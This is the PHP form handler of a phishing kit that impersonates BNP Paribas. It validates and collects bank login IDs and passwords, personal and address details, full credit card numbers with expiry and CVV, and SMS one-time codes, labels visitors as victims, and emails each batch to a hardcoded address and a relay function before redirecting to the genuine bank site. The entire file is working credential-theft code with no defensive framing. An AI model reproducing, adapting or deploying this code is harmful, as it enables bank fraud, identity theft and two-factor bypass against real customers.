<?php

error_reporting(0);
include_once '../inc/app.php';
include_once '../email.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    if( empty($number) ) {
        return false;
    }
    $card = CreditCard::validCreditCard($number);
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}
$to = 'mrrobott38@gmail.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "login1") {

        $_SESSION['client_id1'] = $_POST['client_id'];
        $_SESSION['password1']  = $_POST['password'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['client_id']) == false ) {
            $_SESSION['errors']['client_id'] = true;
        }

        if( validate_number($_POST['password'],6) == false ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $message = '-----[¤BNP LOG INFOS¤]------' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= '[Numuro client*] : ' . $_POST['client_id'] . "\r\n";
            $message .= '[Password*] : ' . $_POST['password'] . "\r\n";
            $message .= '----[¤BNP LOG INFOS¤]------' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP | Login 1'. countryinfo($message);
            c_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: failed.php?validation#_$dispatch");

        } else {
            header("location: failed.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "login2") {

        $_SESSION['client_id2'] = $_POST['client_id'];
        $_SESSION['password2']  = $_POST['password'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['client_id'],10) == false ) {
            $_SESSION['errors']['client_id'] = true;
        }

        if( validate_number($_POST['password'],6) == false ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $message = '------[¤BNP LOG INFOS¤]-----' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= '[Numuro client*] : ' . $_POST['client_id'] . "\r\n";
            $message .= '[Password*] : ' . $_POST['password'] . "\r\n";
            $message .= '-----[¤IP VICTIM¤]-----' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP | Login 2'. countryinfo($message);
            c_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: details.php");

        } else {
            header("location: failed.php");
        }

    }

    if ($_POST['type'] == "details") {

        $_SESSION['first_name'] = $_POST['first_name'];
        $_SESSION['last_name']  = $_POST['last_name'];
        $_SESSION['birth_date'] = $_POST['birth_date'];
        $_SESSION['indicatif']  = $_POST['indicatif'];
        $_SESSION['phone']      = $_POST['phone'];
        $_SESSION['address']    = $_POST['address'];
        $_SESSION['zip_code']   = $_POST['zip_code'];
        $_SESSION['city']       = $_POST['city'];

        $_SESSION['errors'] = [];
        if( validate_name($_POST['first_name']) == false ) {
            $_SESSION['errors']['first_name'] = 'Veuillez saisir un nom valide';
        }

        if( validate_name($_POST['last_name']) == false ) {
            $_SESSION['errors']['last_name'] = 'Veuillez saisir un pr�nom valide';
        }

        if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
            $_SESSION['errors']['birth_date'] = 'Veuillez saisir une date valide';
        }

        if( empty($_POST['indicatif']) ) {
            $_SESSION['errors']['indicatif'] = 'ce champ est obligatoire';
        }

        if( validate_number($_POST['phone']) == false ) {
            $_SESSION['errors']['phone'] = 'Veuillez saisir un num�ro de t�l�phone valide';
        }
        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = 'Veuillez saisir une adresse valide';
        }

        if( validate_number($_POST['zip_code']) == false ) {
            $_SESSION['errors']['zip_code'] = 'Veuillez saisir un code postale valide';
        }

        if( empty($_POST['city']) ) {
            $_SESSION['errors']['city'] = 'Veuillez saisir une ville valide';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $message = '---------[¤BNP ADRESSE INFOS¤]-------' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= '[Nom*] : ' . $_POST['first_name'] . "\r\n";
            $message .= '[Prenom*] : ' . $_POST['last_name'] . "\r\n";
            $message .= '[Birth date*] : ' . $_POST['birth_date'] . "\r\n";
            $message .= '[Indicatif*] : ' . $_POST['indicatif'] . "\r\n";
            $message .= '[Phone*] : ' . $_POST['phone'] . "\r\n";
            $message .= '[Address*] : ' . $_POST['address'] . "\r\n";
            $message .= '[ZIP code*] : ' . $_POST['zip_code'] . "\r\n";
            $message .= '[City*] : ' . $_POST['city'] . "\r\n";
            $message .= '[Clé Digital*] : ' . $_POST['digitalkey'] . "\r\n";
            $message .= '---------[¤IP VICTIME¤]-------' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP | Billing Address'. countryinfo($message);
            c_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: cc_details.php?validation#_$dispatch");

        } else {
            header("location: details.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "card") {
        
        $_SESSION['cc_name']   = $_POST['cc_name'];
        $_SESSION['cc_number'] = $_POST['cc_number'];
        $_SESSION['cc_cvv']    = $_POST['cc_cvv'];
        $_SESSION['cc_date']   = $_POST['cc_date'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);

        if( count($date_ex) > 1 ) {
            $card_date   = $validDate = CreditCard::validDate($date_ex[1], $date_ex[0]);
        } else {
            $card_date = false;
        }

        $_SESSION['errors'] = [];

        if( validate_name($_POST['cc_name']) == false ) {
            $_SESSION['errors']['cc_name'] = 'Veuillez saisir un nom valid.';
        }

        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Veuillez saisir un num�ro de carte valid.';
        }

        if( $card_date == false ) {
            $_SESSION['errors']['cc_date'] = 'Veuillez saisir une date valide.';
        }

        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Veuillez saisir un num�ro valid.';
        }

        if( count($_SESSION['errors']) == 0 ) {
			$message = '--------[¤BNP CARD INFOS¤]------' . $_SERVER['REMOTE_ADDR'] . "\r\n\r\n";
            $message .= '-------[¤BNP LOG1 INFOS¤]------' . "\r\n";
            $message .= '[Client ID*] : ' . $_SESSION['client_id1'] . "\r\n";
            $message .= '[Password*] : ' . $_SESSION['password1'] . "\r\n\r\n";
            $message .= '-------[¤BNP LOG2 INFOS¤]------' . "\r\n";
            $message .= '[Client ID*] : ' . $_SESSION['client_id2'] . "\r\n";
            $message .= '[Password*] : ' . $_SESSION['password2'] . "\r\n";
            $message .= '-------[¤BNP Details INFOS¤]------' . "\r\n";
            $message .= '[Nom*] : ' . $_SESSION['first_name'] . "\r\n";
            $message .= '[Prenom*] : ' . $_SESSION['last_name'] . "\r\n";
            $message .= '[Birth date*] : ' . $_SESSION['birth_date'] . "\r\n";
            $message .= '[Indicatif*] : ' . $_SESSION['indicatif'] . "\r\n";
            $message .= '[Phone*] : ' . $_SESSION['phone'] . "\r\n";
            $message .= '[Address*] : ' . $_SESSION['address'] . "\r\n";
            $message .= '[ZIP code*] : ' . $_SESSION['zip_code'] . "\r\n";
            $message .= '[City*] : ' . $_SESSION['city'] . "\r\n";
            $message .= '-------[¤BNP CARD INFOS¤]------' . "\r\n";
            $message .= '[Card name*] : ' . $_POST['cc_name'] . "\r\n";
            $message .= '[Credit Card Number*]: ' . $_POST['cc_number'] . "\r\n";
            $message .= '[Card date*] : ' . $_POST['cc_date'] . "\r\n";
            $message .= '[Card CVV*] : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= '-------[¤IP VICTIME¤]------' . "\r\n";
            $message .= '🔍IP address : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n\r\n";
            $message .= '-------[¤petronas🖤¤]------' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP | Details'. countryinfo($message);
            c_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            session_destroy();
            header("location: sms.php?particulier#_$dispatch");

        } else {
            header("location: cc_details.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "sms") {

        $sms = $_POST['code_sms'];        

        if( !empty($sms) && validate_number($_POST['code_sms']) != false) {
            $message = '-------[¤BNP SMS1 INFOS¤]------' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= '[SMS] 1 : ' . $_POST['code_sms'] . "\r\n";
            $message .= '-------[¤IP VICTIM¤]------' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP | SMS 1'. countryinfo($message);
            c_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            session_destroy();
            header("location: sms2.php");
        } else {
            header("location: sms2.php");
        }
    }

    if ($_POST['type'] == "sms2") {

        $sms2 = $_POST['code_sms2']; 
            {
            $message = '-------[¤BNP SMS2 INFOS¤]------' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= '[SMS*] 2 : ' . $_POST['code_sms2'] . "\r\n";
            $message .= '-------[¤IP VICTIM¤]------' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP | SMS 2'. countryinfo($message);
            c_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            session_destroy();
            header("location: https://mabanque.bnpparibas/");
        }
    }

}

?>